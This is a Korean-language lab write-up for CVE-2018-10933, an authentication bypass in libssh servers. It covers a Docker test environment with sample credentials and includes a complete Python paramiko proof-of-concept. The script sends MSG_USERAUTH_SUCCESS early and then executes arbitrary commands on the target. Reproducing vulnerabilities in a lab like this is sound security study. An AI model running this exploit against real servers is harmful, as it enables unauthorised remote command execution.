# CVE-2018-10933

**Contributor**
- 김기현
<br/>

### 취약점에 대한 요약

- libssh는 클라이언트 및 서버 측에 SSHv2 프로토콜을 구현하는 다중 플랫폼 C 라이브러리임.
- libssh의 서버 측 상태 시스템에 논리 취약점이 발견됨.
- 공격자는 인증이 성공하기 전에 'MSG_USERAUTH_SUCCESS' 메시지를 보낼 수 있음.
- 이를 통해 인증을 무시하고 대상 SSH 서버에 액세스할 수 있음.

<br/>

참고자료 및 문헌:

- https://www.libssh.org/security/advisories/CVE-2018-10933.txt
- https://www.seebug.org/vuldb/ssvid-97614

<br/>

## 환경설정 및 실행

다음의 명령어를 통해 테스트 환경을 구성함.

```
docker compose up -d
```

환경이 실행되고 나면, `your-ip:2222` 포트와 (계정 비밀번호: `myuser:mypassword`)룰 통해 접속할 수 있음. 
정상적인 접속은 다음과 같음.

![](1.png)

<br/>

## 공격

POC는 다음 사이트에 자세하게 나와있음. https://www.seebug.org/vuldb/ssvid-97614,
<br/>다음의 코드를 통해 이 취약점이 실제 존재함을 증명할 수 있음.

```python
#!/usr/bin/env python3

import sys
import paramiko
import socket
import logging

# 로깅 설정, 표준 출력으로 로그 출력.
logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)

bufsize = 2048

# SSH 명령 실행 함수 정의
def execute(hostname, port, command):

    # TCP 소켓 생성
    sock = socket.socket()

    try:
        # 원격 호스트와 포트로 소켓 연결 시도
        sock.connect((hostname, int(port)))

        # Paramiko 라이브러리를 사용하여 SSH 연결을 설정.
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        # SSH 사용자 인증 요청 메시지를 보냄. --> 취약점 익스플로잇
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        
         # SSH 세션을 열고 지정된 명령을 실행.
        client = transport.open_session(timeout=10)
        client.exec_command(command)
       

        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        # 문자열 디코딩
        return (output + error).decode()
    except paramiko.SSHException as e:

        # SSH 연결 예외 처리
        logging.exception(e)
        logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")

        # SSH 연결 중에 발생하는 예외를 처리하고 로그 기록.
    except socket.error:
        # 소켓 연결 예외 처리
        logging.debug("Unable to connect.")

    return None

if __name__ == '__main__':

    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))


```

위 코드의 실행으로, 공격 대상 서버에서 임의의 명령어를 실행할 수 있게 됨.

<br/>

## 결과
![](2.png)
